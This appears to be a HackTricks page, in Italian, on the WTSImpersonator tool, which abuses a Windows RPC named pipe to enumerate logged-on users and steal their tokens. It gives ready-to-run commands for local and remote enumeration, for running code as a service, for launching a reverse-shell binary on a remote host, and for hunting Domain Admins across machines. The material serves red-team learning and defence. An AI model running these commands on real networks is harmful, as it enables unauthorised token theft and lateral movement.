{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Lo strumento **WTS Impersonator** sfrutta il **"\\pipe\LSM_API_service"** RPC Named pipe per enumerare furtivamente gli utenti connessi e dirottare i loro token, eludendo le tecniche tradizionali di impersonificazione dei token. Questo approccio facilita movimenti laterali senza soluzione di continuità all'interno delle reti. L'innovazione dietro questa tecnica è attribuita a **Omri Baso, il cui lavoro è accessibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funzionalità Principali
Lo strumento opera attraverso una sequenza di chiamate API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli Chiave e Utilizzo
- **Enumerazione Utenti**: L'enumerazione degli utenti locali e remoti è possibile con lo strumento, utilizzando comandi per ciascun scenario:
- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotamente, specificando un indirizzo IP o un nome host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Esecuzione di Comandi**: I moduli `exec` e `exec-remote` richiedono un contesto di **Servizio** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:
- Esempio per l'esecuzione di comandi locali:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe può essere utilizzato per ottenere un contesto di servizio:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Esecuzione Remota di Comandi**: Comporta la creazione e l'installazione di un servizio a distanza simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.
- Esempio di esecuzione remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modulo di Caccia agli Utenti**: Mira a utenti specifici su più macchine, eseguendo codice sotto le loro credenziali. Questo è particolarmente utile per mirare agli Amministratori di Dominio con diritti di amministratore locale su diversi sistemi.
- Esempio di utilizzo:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Impara e pratica il Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
